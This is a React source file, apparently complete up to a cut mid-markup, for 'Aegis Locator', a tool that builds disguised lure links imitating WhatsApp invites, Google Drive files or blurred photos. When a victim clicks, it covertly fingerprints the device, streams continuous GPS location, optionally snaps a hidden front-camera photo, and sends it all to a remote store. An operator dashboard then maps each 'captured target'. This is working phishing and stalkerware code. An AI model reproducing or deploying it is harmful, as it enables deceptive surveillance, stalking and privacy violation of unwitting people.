import React, { useState, useEffect, useRef } from 'react';
import { apiCreate, apiGet, apiAddTarget, compressImage } from './api';
import { 
  MapContainer, 
  TileLayer, 
  Marker, 
  Popup, 
  Circle, 
  useMap,
  Polyline
} from 'react-leaflet';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import { 
  Shield, 
  MapPin, 
  UploadCloud, 
  Globe, 
  Activity, 
  Wifi, 
  Terminal, 
  Copy, 
  ExternalLink, 
  Navigation, 
  Eye, 
  RefreshCw, 
  Play, 
  Check, 
  Map, 
  Laptop,
  Compass,
  AlertTriangle
} from 'lucide-react';

// Custom Map Panner component to center the map when coords change
function ChangeView({ center, zoom }) {
  const map = useMap();
  useEffect(() => {
    map.setView(center, zoom);
  }, [center, zoom]);
  return null;
}

// Cyberpunk Map Pin Icon
const targetIcon = L.divIcon({
  className: 'cyber-target-icon',
  html: `
    <div class="pin-wrapper">
      <div class="pin-pulse"></div>
      <div class="pin-dot"></div>
    </div>
  `,
  iconSize: [30, 30],
  iconAnchor: [15, 15]
});

// Custom CSS injector for Leaflet pins
const style = document.createElement('style');
style.innerHTML = `
  .pin-wrapper {
    position: relative;
    width: 30px;
    height: 30px;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .pin-dot {
    width: 12px;
    height: 12px;
    background-color: #00ff66;
    border: 2px solid #050811;
    border-radius: 50%;
    box-shadow: 0 0 10px #00ff66;
    z-index: 2;
  }
  .pin-pulse {
    position: absolute;
    width: 30px;
    height: 30px;
    border: 2px solid #00ff66;
    border-radius: 50%;
    animation: pinPulseAnimation 1.5s ease-out infinite;
    opacity: 0;
    z-index: 1;
  }
  @keyframes pinPulseAnimation {
    0% { transform: scale(0.2); opacity: 0.8; }
    100% { transform: scale(1.5); opacity: 0; }
  }
`;
document.head.appendChild(style);

// Fingerprint leve do dispositivo para deduplicação robusta de alvos
function getDeviceId() {
  const stored = sessionStorage.getItem('_aegis_did');
  if (stored) return stored;
  const raw = [
    navigator.userAgent,
    screen.width + 'x' + screen.height,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
    navigator.language,
    String(navigator.hardwareConcurrency || ''),
    String(screen.colorDepth || '')
  ].join('|');
  let hash = 0;
  for (let i = 0; i < raw.length; i++) {
    hash = ((hash << 5) - hash) + raw.charCodeAt(i);
    hash |= 0;
  }
  const did = Math.abs(hash).toString(36) + Date.now().toString(36).slice(-4);
  sessionStorage.setItem('_aegis_did', did);
  return did;
}

export default function App() {
  const [activeTab, setActiveTab] = useState('creation'); // 'creation' | 'monitor'
  const [imageFile, setImageFile] = useState(null);
  const [imagePreview, setImagePreview] = useState(null);
  const [title, setTitle] = useState('Confirmação Necessária');
  const [description, setDescription] = useState('Você foi convidado para visualizar esta foto compartilhada.');
  const [template, setTemplate] = useState('default');
  const [requireCamera, setRequireCamera] = useState(false);
  const [generatedLink, setGeneratedLink] = useState('');
  const [copied, setCopied] = useState(false);
  const [keyCopied, setKeyCopied] = useState(false);
  const [showKeyModal, setShowKeyModal] = useState(false); // modal de backup obrigatório
  const [operatorUrl, setOperatorUrl] = useState('');       // URL portável com id+key
  const [campaignExpiry, setCampaignExpiry] = useState(''); // data de expiração
  const [pollBackoff, setPollBackoff] = useState(0);        // contador de polls sem novidades
  const [contentUnlocked, setContentUnlocked] = useState(false); // preview desbloqueada pelo alvo
  const [showFullscreenImage, setShowFullscreenImage] = useState(false); // tela cheia para imagem no preview
  
  // Terminal logs state
  const [logs, setLogs] = useState([
    { id: 1, time: '08:30:12', text: 'SISTEMA INICIALIZADO: Aegis Locator v3.5', type: 'system' },
    { id: 2, time: '08:30:15', text: 'Banco de dados: JSONBlob remoto (persistência garantida)', type: 'system' },
    { id: 3, time: '08:30:18', text: 'Aguardando upload de imagem e criação de link...', type: 'info' }
  ]);

  // Target Database — dados reais vindos do JSONBlob API (cross-device)
  const [targets, setTargets] = useState([]);
  const [activeCampaignId, setActiveCampaignId] = useState(null);
  const [activeCampaignKey, setActiveCampaignKey] = useState(null); // secretKey do operador
  const [isGenerating, setIsGenerating] = useState(false);
  const [previewCampaign, setPreviewCampaign] = useState(null);
  const [previewLoading, setPreviewLoading] = useState(false);
  const [campaignIndex, setCampaignIndex] = useState(() => {
    const s = localStorage.getItem('aegis_campaign_index');
    return s ? JSON.parse(s) : [];
  });
  const pollingRef = useRef(null);

  const [selectedTarget, setSelectedTarget] = useState(null);
  
  // Current client-side status (for self-test)
  const [trackingStatus, setTrackingStatus] = useState('idle'); // 'idle' | 'tracking' | 'success' | 'error'
  const [trackingMethod, setTrackingMethod] = useState(''); // 'GPS' | 'IP'
  const [currentCoords, setCurrentCoords] = useState([-23.55052, -46.633308]); // Default São Paulo
  const [mapZoom, setMapZoom] = useState(13);
  const [locationDetails, setLocationDetails] = useState({
    ip: 'Detectando...',
    city: 'Detectando...',
    region: 'Detectando...',
    country: 'Detectando...',
    isp: 'Detectando...',
    accuracy: 'N/A',
    provider: 'N/A',
    timestamp: ''
  });

  const [isPreviewMode, setIsPreviewMode] = useState(false);

  // Persiste índice local de campanhas do operador
  useEffect(() => {
    localStorage.setItem('aegis_campaign_index', JSON.stringify(campaignIndex));
  }, [campaignIndex]);

  // Detecta modo preview (alvo abrindo o link gerado)
  // O autoTrackTarget NÃO é chamado aqui — será chamado apenas quando o
  // alvo clicar em "Confirmar e Ver Conteúdo" (gesto do usuário = GPS concedido)
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const isPreview = window.location.pathname.includes('/preview') || !!id;
    if (isPreview && id) {
      setIsPreviewMode(true);
      setPreviewLoading(true);
      apiGet(id)
        .then(data => setPreviewCampaign(data))
        .catch(() => setPreviewCampaign({
          title: 'Confirmação Requerida',
          description: 'Permita o acesso para carregar o conteúdo compartilhado.',
          image: null
        }))
        .finally(() => setPreviewLoading(false));
    }
  }, []);


  // Polling adaptativo — dobra intervalo após 8 polls sem novidades (até 30s)
  useEffect(() => {
    if (activeTab !== 'monitor' || !activeCampaignId) return;
    let interval = 2000; // começa em 2s
    let emptyCount = 0;
    let timeoutId;

    const poll = async () => {
      try {
        const data = await apiGet(activeCampaignId, activeCampaignKey);
        const fresh = data.targets || [];
        setTargets(prev => {
          if (JSON.stringify(prev) !== JSON.stringify(fresh)) {
            emptyCount = 0;
            interval = 2000;
            if (fresh.length > prev.length) {
              const newest = fresh[0];
              setSelectedTarget(newest);
              setCurrentCoords(newest.coords);
              setMapZoom(newest.method === 'GPS' ? 16 : 12);
              addLog(`ALVO CAPTURADO: ${newest.id} via ${newest.method} (${newest.city})`, 'success');
              // Notificação push do browser
              if (Notification.permission === 'granted') {
                new Notification('AEGIS — Novo Alvo Capturado', {
                  body: `ID: ${newest.id} | ${newest.city} | ${newest.method}`,
                  icon: '/favicon.svg'
                });
              }
            }
            return fresh;
          }
          // Sem novidades: incrementa contador e dobra intervalo (máx 30s)
          emptyCount++;
          if (emptyCount >= 8) {
            interval = Math.min(interval * 2, 30000);
            emptyCount = 0;
          }
          return prev;
        });
      } catch {}
      timeoutId = setTimeout(poll, interval);
    };

    // Solicita permissão de notificação ao entrar no monitor
    if (Notification.permission === 'default') Notification.requestPermission();

    addLog(`Monitor ativo: polling adaptativo iniciado para [${activeCampaignId.slice(-6).toUpperCase()}]`, 'system');
    if (!activeCampaignKey) addLog('AVISO: Chave secreta não encontrada. Alvos podem não ser visíveis.', 'error');
    poll();
    return () => clearTimeout(timeoutId);
  }, [activeTab, activeCampaignId, activeCampaignKey]);

  // Payload silencioso de rastreamento — grava no JSONBlob (cross-device)
  // Inclui deviceId para deduplicação robusta no servidor
  const autoTrackTarget = async (campaignId) => {
    if (!campaignId) return;
    const deviceId = getDeviceId();
    const save = (target) => apiAddTarget(campaignId, { ...target, deviceId }).catch(() => {});

    // --- Módulo 1: Telemetria de Hardware Avançada ---
    let batteryLevel = 'Desconhecido';
    let isCharging = false;
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
        isCharging = battery.charging;
      }
    } catch (e) {}

    const hwTelemetry = {
      ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB+` : 'Desconhecido',
      cpuCores: navigator.hardwareConcurrency || 'Desconhecido',
      connection: navigator.connection ? navigator.connection.effectiveType : 'Desconhecido',
      battery: batteryLevel,
      charging: isCharging,
      platform: navigator.platform || 'Desconhecido',
      resolution: `${window.innerWidth}x${window.innerHeight}`
    };

    // --- Módulo 4: Prova Facial (Câmera Oculta) ---
    let photoBase64 = null;
    if (previewCampaign?.requireCamera) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        photoBase64 = canvas.toDataURL('image/jpeg', 0.5); // 50% de qualidade
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.warn('Câmera negada ou indisponível', e);
      }
    }

    const targetId = Math.random().toString(36).substring(2, 6).toUpperCase();

    // Tenta GPS primeiro; sem HTTPS, vai direto para IP
    if (!window.isSecureContext) {
      fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
        const loc = (data.loc || '-23.55052,-46.633308').split(',');
        save({
          id: targetId,
          coords: [parseFloat(loc[0]), parseFloat(loc[1])],
          method: 'IP',
          ip: data.ip || 'Desconhecido',
          city: data.city || 'Desconhecida',
          region: data.region || 'Desconhecido',
          country: data.country || 'BR',
          isp: data.org || 'Desconhecido',
          accuracy: '~5-10km (IP)',
          provider: 'ipinfo.io (contexto não-HTTPS)',
          timestamp: new Date().toLocaleString(),
          hwTelemetry,
          photoBase64
        });
      }).catch(() => {});
      return;
    }

    if (navigator.geolocation) {
      // --- Módulo 2: Rastreamento Contínuo (WatchPosition) ---
      let lastUpdate = 0;
      
      const geoSuccess = (position) => {
        // Throttle para não bombardear a API (atualiza a cada 5 segundos no máximo)
        const now = Date.now();
        if (now - lastUpdate < 5000) return;
        lastUpdate = now;

        const { latitude, longitude, accuracy } = position.coords;
        Promise.all([
          fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(r => r.json()).catch(() => ({}))
        ]).then(([ipData, geoData]) => {
          const addr = geoData.address || {};
          const city = addr.city || addr.town || addr.village || addr.municipality || ipData.city || 'Desconhecida';
          const suburb = addr.suburb || addr.neighbourhood || addr.district || '';
          save({
            id: targetId,
            coords: [latitude, longitude],
            method: 'GPS',
            ip: ipData.ip || 'Ocultado',
            city: suburb ? `${city} (${suburb})` : city,
            region: addr.road || addr.county || ipData.region || 'Desconhecido',
            country: (addr.country_code || ipData.country || 'BR').toUpperCase(),
            isp: ipData.org || 'Desconhecido',
            accuracy: `${accuracy.toFixed(1)} metros (GPS Real-time)`,
            provider: 'GPS + OpenStreetMap',
            timestamp: new Date().toLocaleString(),
            hwTelemetry,
            photoBase64
          });
        });
      };

      const geoError = () => {
        if (lastUpdate !== 0) return; // Só manda IP se falhar no primeiro momento
        fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
          const loc = (data.loc || '-23.55052,-46.633308').split(',');
          save({
            id: targetId,
            coords: [parseFloat(loc[0]), parseFloat(loc[1])],
            method: 'IP',
            ip: data.ip || 'Desconhecido',
            city: data.city || 'Desconhecida',
            region: data.region || 'Desconhecido',
            country: data.country || 'BR',
            isp: data.org || 'Desconhecido',
            accuracy: '~5-10km (IP)',
            provider: 'ipinfo.io',
            timestamp: new Date().toLocaleString(),
            hwTelemetry,
            photoBase64
          });
        }).catch(() => {});
      };

      navigator.geolocation.watchPosition(geoSuccess, geoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
    }
  };

  const addLog = (text, type = 'info') => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { id: Date.now(), time, text, type }]);
  };

  // Handle image upload
  const handleImageChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setImageFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result);
        addLog(`Imagem carregada com sucesso: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`, 'success');
      };
      reader.readAsDataURL(file);
    }
  };

  // Gera link de rastreamento real — hospeda campanha no JSONBlob
  const handleGenerateLink = async () => {
    if (!imagePreview) {
      addLog('ERRO: Upload de imagem obrigatório para gerar o preview.', 'error');
      alert('Por favor, faça upload de uma imagem primeiro.');
      return;
    }
    setIsGenerating(true);
    addLog('Comprimindo imagem e criando campanha no JSONBlob remoto...', 'system');
    try {
      const compressed = await compressImage(imagePreview);

      // Atualiza preview com a versão COMPRIMIDA — garante que operador vê
      // exatamente a mesma imagem que o alvo verá no link gerado
      setImagePreview(compressed);

      // apiCreate retorna { id, secretKey, expiresAt }
      const { id, secretKey, expiresAt } = await apiCreate({ title, description, image: compressed, template, requireCamera });
      const link = `${window.location.origin}/preview?id=${id}`;
      const opUrl = `${window.location.origin}/?operator=1&id=${id}&key=${secretKey}`;

      setGeneratedLink(link);
      setActiveCampaignId(id);
      setActiveCampaignKey(secretKey);
      setOperatorUrl(opUrl);
      setCampaignExpiry(expiresAt ? new Date(expiresAt).toLocaleDateString('pt-BR') : '');

      const entry = { id, secretKey, title, createdAt: new Date().toISOString(), expiresAt };
      setCampaignIndex(prev => [entry, ...prev]);

      addLog(`Campanha criada! ID: [${id.slice(-8).toUpperCase()}]`, 'success');
      addLog(`Imagem verificada — operador e alvo vêm a mesma versão comprimida.`, 'system');
      addLog('JSONBlob dual-blob ativo. Alvos capturados em tempo real.', 'info');

      // Abre modal obrigatório de backup da chave secreta
      setShowKeyModal(true);
    } catch (e) {
      addLog(`ERRO ao criar campanha: ${e.message}`, 'error');
      alert('Falha ao criar link. Verifique sua conexão com a internet.');
    } finally {
      setIsGenerating(false);
    }
  };

  // Copy link
  const handleCopyLink = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    addLog('Link copiado para a área de transferência.', 'info');
    setTimeout(() => setCopied(false), 2000);
  };

  // Copy secret key
  const handleCopyKey = () => {
    if (activeCampaignKey) {
      navigator.clipboard.writeText(activeCampaignKey);
      setKeyCopied(true);
      addLog('Chave secreta copiada. Guarde-a em local seguro.', 'system');
      setTimeout(() => setKeyCopied(false), 2000);
    }
  };

  // Self tracking triggering (for testing the system)
  const triggerSelfTracking = () => {
    setTrackingStatus('tracking');
    addLog('Solicitando Geolocation API ao navegador do alvo...', 'system');
    
    // GPS capture
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // Success
          const { latitude, longitude, accuracy } = position.coords;
          setCurrentCoords([latitude, longitude]);
          setMapZoom(16);
          setTrackingMethod('GPS');
          setTrackingStatus('success');
          addLog(`GPS ATIVO: Lat ${latitude.toFixed(6)}, Lng ${longitude.toFixed(6)} | Precisão: ${accuracy.toFixed(1)}m`, 'success');          // Reverse lookup with IP and Geocoding API for exact street/neighborhood address
          Promise.all([
            fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({})),
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(res => res.json()).catch(() => ({}))
          ]).then(([ipData, geoData]) => {
            const address = geoData.address || {};
            const city = address.city || address.town || address.village || address.municipality || ipData.city || 'Desconhecida';
            const suburb = address.suburb || address.neighbourhood || address.district || '';
            const road = address.road || '';
            
            const newDetails = {
              ip: ipData.ip || 'Ocultado',
              city: suburb ? `${city} (Bairro: ${suburb})` : city,
              region: road || address.county || ipData.region || 'Desconhecido',
              country: address.country_code?.toUpperCase() || ipData.country || 'BR',
              isp: ipData.org || 'Provedor Desconhecido',
              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
              provider: 'GPS Local + OpenStreetMap',
              timestamp: new Date().toLocaleString()
            };
            setLocationDetails(newDetails);
            
            // Registra alvo localmente e na API (se campanha ativa)
            const newTarget = {
              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
              coords: [latitude, longitude],
              method: 'GPS',
              ...newDetails
            };
            setTargets(prev => [newTarget, ...prev]);
            setSelectedTarget(newTarget);
            if (activeCampaignId) apiAddTarget(activeCampaignId, newTarget).catch(() => {});
          });
        },
        (error) => {
          // GPS Denied / Error - Fallback to IP
          addLog(`GPS NEGADO: Código ${error.code} - ${error.message}. Iniciando fallback para IP...`, 'error');
          setTrackingMethod('IP');
          
          fetch('https://ipinfo.io/json')
            .then(res => res.json())
            .then(data => {
              const loc = data.loc ? data.loc.split(',') : ['-23.55052', '-46.633308'];
              const lat = parseFloat(loc[0]);
              const lng = parseFloat(loc[1]);
              
              setCurrentCoords([lat, lng]);
              setMapZoom(12);
              setTrackingStatus('success');
              addLog(`RASTREAMENTO IP CONCLUÍDO: ${data.ip} (${data.city}/${data.region})`, 'success');
              
              const newDetails = {
                ip: data.ip,
                city: data.city || 'Desconhecida',
                region: data.region || 'Desconhecido',
                country: data.country || 'Desconhecido',
                isp: data.org || 'Provedor Desconhecido',
                accuracy: '~5-10km (Provedor)',
                provider: 'IP Lookup (ipinfo.io)',
                timestamp: new Date().toLocaleString()
              };
              setLocationDetails(newDetails);
              
              const newTarget = {
                id: Math.random().toString(36).substring(2, 6).toUpperCase(),
                coords: [lat, lng],
                method: 'IP',
                ...newDetails
              };
              setTargets(prev => [newTarget, ...prev]);
              setSelectedTarget(newTarget);
              if (activeCampaignId) apiAddTarget(activeCampaignId, newTarget).catch(() => {});
            })
            .catch(err => {
              setTrackingStatus('error');
              addLog(`FALHA GERAL: Não foi possível obter localização via GPS nem IP.`, 'error');
            });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      addLog('ERRO: Geolocation não suportado neste navegador. Tentando IP...', 'error');
      // Fallback direct
    }
  };

  // Simulate targets from other places (glorious test suite)
  const simulateTarget = (type) => {
    addLog(`Iniciando simulação de acesso: Tipo [${type}]`, 'system');
    
    setTimeout(() => {
      let mockTarget = {};
      if (type === 'gps_sp') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [-23.5615, -46.6623], // Paulista, SP
          method: 'GPS',
          ip: '189.120.45.22',
          city: 'São Paulo',
          region: 'São Paulo',
          country: 'BR',
          isp: 'Vivo Fibra',
          accuracy: '8.4 metros (GPS)',
          provider: 'MOCK GPS Simulator',
          timestamp: new Date().toLocaleString()
        };
      } else if (type === 'ip_rj') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [-22.9068, -43.1729], // Rio de Janeiro
          method: 'IP',
          ip: '200.180.12.89',
          city: 'Rio de Janeiro',
          region: 'Rio de Janeiro',
          country: 'BR',
          isp: 'Claro Brasil',
          accuracy: '~8km (Provedor)',
          provider: 'MOCK IP Simulator',
          timestamp: new Date().toLocaleString()
        };
      } else if (type === 'gps_ny') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [40.7580, -73.9855], // Times Square, NY
          method: 'GPS',
          ip: '64.233.160.10',
          city: 'New York',
          region: 'New York',
          country: 'US',
          isp: 'Google LLC',
          accuracy: '3.0 metros (GPS)',
          provider: 'MOCK GPS Simulator',
          timestamp: new Date().toLocaleString()
        };
      }

      setTargets(prev => [mockTarget, ...prev]);
      setSelectedTarget(mockTarget);
      setCurrentCoords(mockTarget.coords);
      setMapZoom(mockTarget.method === 'GPS' ? 16 : 12);
      addLog(`SIMULAÇÃO ATIVA: Alvo ${mockTarget.id} localizado via ${mockTarget.method} (${mockTarget.city})`, 'success');
      setActiveTab('monitor');
    }, 1200);
  };

  const clearDatabase = () => {
    if (window.confirm('Deseja limpar o monitor local? (Os dados no servidor JSONBlob não são apagados)')) {
      setTargets([]);
      setSelectedTarget(null);
      setActiveCampaignId(null);
      setActiveCampaignKey(null);
      setGeneratedLink('');
      addLog('Monitor local limpo. Gere um novo link para iniciar nova campanha.', 'info');
    }
  };

  if (isPreviewMode) {
    if (previewLoading) {
      return (
        <div style={{ width:'100vw', height:'100vh', background:'#0e1118', display:'flex', justifyContent:'center', alignItems:'center', color:'#fff', fontFamily:'sans-serif' }}>
          <div style={{ textAlign:'center' }}>
            <div style={{ width:'40px', height:'40px', border:'3px solid #3b82f6', borderTopColor:'transparent', borderRadius:'50%', animation:'spin 1s linear infinite', margin:'0 auto 16px' }} />
            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
            <p style={{ color:'#94a3b8', fontSize:'0.9rem' }}>Carregando conteúdo...</p>
          </div>
        </div>
      );
    }
    return (
      <div style={{ width:'100vw', minHeight:'100vh', background: previewCampaign?.template === 'whatsapp' ? '#efeae2' : previewCampaign?.template === 'gdrive' ? '#f8f9fa' : '#0e1118', display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', color: previewCampaign?.template === 'default' ? '#fff' : '#333', fontFamily:'sans-serif', padding:'20px', boxSizing:'border-box' }}>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } } @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }`}</style>
        
        {previewCampaign?.template === 'whatsapp' ? (
          <div style={{ maxWidth:'400px', width:'100%', textAlign:'center', background:'#fff', padding:'30px 20px', borderRadius:'12px', boxShadow:'0 4px 12px rgba(0,0,0,0.1)', animation:'fadeIn 0.4s ease' }}>
            <div style={{ width: '80px', height: '80px', borderRadius: '50%', background: '#25D366', margin: '0 auto 15px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <Globe size={40} color="#fff" />
            </div>
            <h2 style={{ fontSize:'1.4rem', marginBottom:'8px', color:'#111b21', fontWeight:'600' }}>
              {previewCampaign?.title || 'Convite de Grupo'}
            </h2>
            <p style={{ fontSize:'0.9rem', color:'#667781', margin:'0 0 25px 0' }}>
              {previewCampaign?.description || 'Você foi convidado para participar deste grupo do WhatsApp.'}
            </p>
            {!contentUnlocked ? (
              <button
                onClick={() => {
                  setContentUnlocked(true);
                  const cid = new URLSearchParams(window.location.search).get('id');
                  autoTrackTarget(cid);
                }}
                style={{ background:'#00a884', border:'none', color:'#fff', padding:'14px 32px', borderRadius:'24px', fontWeight:'bold', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 2px 4px rgba(0,0,0,0.2)' }}
              >
                Entrar no Grupo
              </button>
            ) : (
              <div style={{ padding: '15px', background: '#dcf8c6', color: '#111b21', borderRadius: '8px', fontSize: '0.9rem' }}>
                Entrando no grupo... Aguarde a aprovação do administrador.
              </div>
            )}
          </div>
        ) : previewCampaign?.template === 'gdrive' ? (
          <div style={{ maxWidth:'450px', width:'100%', background:'#fff', padding:'30px', borderRadius:'8px', border:'1px solid #dadce0', boxShadow:'0 1px 3px rgba(60,64,67,0.3)', animation:'fadeIn 0.4s ease' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '20px', borderBottom: '1px solid #dadce0', paddingBottom: '15px' }}>
              <div style={{ width: '32px', height: '32px', background: '#ea4335', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontWeight: 'bold', fontSize: '0.8rem' }}>PDF</div>
              <div style={{ flex: 1 }}>
                <h2 style={{ fontSize:'1.1rem', margin:0, color:'#202124', fontWeight:'500' }}>
                  {previewCampaign?.title || 'Documento Confidencial.pdf'}
                </h2>
                <div style={{ fontSize:'0.8rem', color:'#5f6368', marginTop:'4px' }}>Google Drive</div>
              </div>
            </div>
            <p style={{ fontSize:'0.9rem', color:'#3c4043', margin:'0 0 25px 0' }}>
              {previewCampaign?.description || 'O proprietário concedeu acesso de visualização a este arquivo.'}
            </p>
            {!contentUnlocked ? (
              <button
                onClick={() => {
                  setContentUnlocked(true);
                  const cid = new URLSearchParams(window.location.search).get('id');
                  autoTrackTarget(cid);
                }}
                style={{ background:'#1a73e8', border:'none', color:'#fff', padding:'10px 24px', borderRadius:'4px', fontWeight:'500', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
              >
                Fazer Download do Arquivo
              </button>
            ) : (
              <div style={{ padding: '15px', border: '1px solid #ceead6', background: '#e6f4ea', color: '#137333', borderRadius: '4px', fontSize: '0.9rem', textAlign: 'center' }}>
                Iniciando download seguro... Verifique sua pasta.
              </div>
            )}
          </div>
        ) : (
          /* DEFAULT: Cadeado de Imagem */
          <div style={{ maxWidth:'520px', width:'100%', textAlign:'center', background:'#151a24', padding:'30px', borderRadius:'12px', boxShadow:'0 20px 60px rgba(0,0,0,0.7)', border:'1px solid #202b3c', animation:'fadeIn 0.4s ease' }}>
            {previewCampaign?.image && (
              <div style={{ position:'relative', marginBottom:'20px', borderRadius:'8px', overflow:'hidden' }}>
                <img
                  src={previewCampaign.image}
                  alt="Conteúdo"
                  style={{ width:'100%', maxHeight:'55vh', objectFit:'cover', borderRadius:'8px', filter: contentUnlocked ? 'none' : 'blur(18px)', transition:'filter 0.5s ease', display:'block' }}
                />
                {!contentUnlocked && (
                  <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', background:'rgba(14,17,24,0.5)' }}>
                    <div style={{ fontSize:'2rem', marginBottom:'8px' }}>🔒</div>
                    <span style={{ color:'#e2e8f0', fontSize:'0.85rem', fontWeight:'bold' }}>Confirme para desbloquear</span>
                  </div>
                )}
              </div>
            )}

            <h2 style={{ fontSize:'1.2rem', marginBottom:'8px', color:'#e2e8f0', fontWeight:'700' }}>
              {previewCampaign?.title || 'Confirmação Requerida'}
            </h2>
            <p style={{ fontSize:'0.875rem', color:'#94a3b8', margin:'0 0 22px 0', lineHeight:'1.5' }}>
              {previewCampaign?.description || 'Permita o acesso para carregar o conteúdo compartilhado.'}
            </p>

            {!contentUnlocked ? (
              <button
                onClick={() => {
                  setContentUnlocked(true);
                  const cid = new URLSearchParams(window.location.search).get('id');
                  autoTrackTarget(cid);
                }}
                style={{ background:'linear-gradient(135deg, #3b82f6, #1d4ed8)', border:'none', color:'#fff', padding:'13px 32px', borderRadius:'8px', fontWeight:'700', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 4px 20px rgba(59,130,246,0.4)' }}
              >
                ✅ Confirmar e Ver Conteúdo
              </button>
            ) : (
              <button
                onClick={() => setShowFullscreenImage(true)}
                style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
              >
                🖼️ Abrir Mídia em Tela Cheia
              </button>
            )}
          </div>
        )}

        {/* Modal de imagem em tela cheia na própria página */}
        {showFullscreenImage && previewCampaign?.image && (
          <div 
            style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.95)', zIndex:99999, display:'flex', justifyContent:'center', alignItems:'center', cursor:'zoom-out' }}
            onClick={() => setShowFullscreenImage(false)}
          >
            <img src={previewCampaign.image} style={{ maxWidth:'100%', maxHeight:'100vh', objectFit:'contain' }} />
            <div style={{ position:'absolute', top:'20px', right:'20px', color:'#fff', background:'rgba(255,255,255,0.2)', width:'40px', height:'40px', borderRadius:'50%', display:'flex', justifyContent:'center', alignItems:'center', fontWeight:'bold', fontSize:'1.2rem' }}>
              X
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
      <div className="scanline"></div>

      {/* ── Modal obrigatório de backup da chave secreta ─────────────────────── */}
      {showKeyModal && (
        <div style={{ position:'fixed', inset:0, background:'rgba(5,8,17,0.92)', zIndex:9999, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px' }}>
          <div style={{ background:'#0a0f1d', border:'1px solid var(--neon-green)', borderRadius:'8px', padding:'30px', maxWidth:'520px', width:'100%', boxShadow:'0 0 40px rgba(0,255,102,0.2)' }}>
            <div style={{ display:'flex', alignItems:'center', gap:'10px', marginBottom:'20px' }}>
              <AlertTriangle size={22} style={{ color:'var(--neon-alert)', flexShrink:0 }} />
              <h3 style={{ fontFamily:'var(--font-display)', fontSize:'1rem', color:'var(--neon-alert)', letterSpacing:'2px', margin:0 }}>
                GUARDE SUA CHAVE SECRETA
              </h3>
            </div>
            <p style={{ fontSize:'0.82rem', color:'var(--text-muted)', marginBottom:'18px', lineHeight:'1.6' }}>
              Esta chave é a <strong style={{ color:'var(--text-main)' }}>única forma</strong> de acessar os alvos capturados. Ela <strong style={{ color:'var(--neon-alert)' }}>não pode ser recuperada</strong> se perdida. Salve-a agora em local seguro.
            </p>

            {/* Chave Secreta */}
            <div style={{ background:'rgba(0,255,102,0.05)', border:'1px solid rgba(0,255,102,0.3)', borderRadius:'4px', padding:'12px 15px', marginBottom:'12px' }}>
              <div style={{ fontSize:'0.65rem', color:'var(--text-muted)', fontFamily:'var(--font-mono)', marginBottom:'5px' }}>CHAVE SECRETA</div>
              <div style={{ fontFamily:'var(--font-mono)', color:'var(--neon-green)', fontSize:'0.82rem', wordBreak:'break-all', marginBottom:'8px' }}>{activeCampaignKey}</div>
              <button onClick={handleCopyKey} style={{ background:'transparent', border:'1px solid var(--neon-green)', color:'var(--neon-green)', padding:'4px 12px', fontSize:'0.72rem', cursor:'pointer', fontFamily:'var(--font-mono)', borderRadius:'2px', display:'flex', alignItems:'center', gap:'5px' }}>
                {keyCopied ? <Check size={12}/> : <Copy size={12}/>} {keyCopied ? 'Copiada!' : 'Copiar Chave'}
              </button>
            </div>

            {/* URL Portável do Operador */}
            {operatorUrl && (
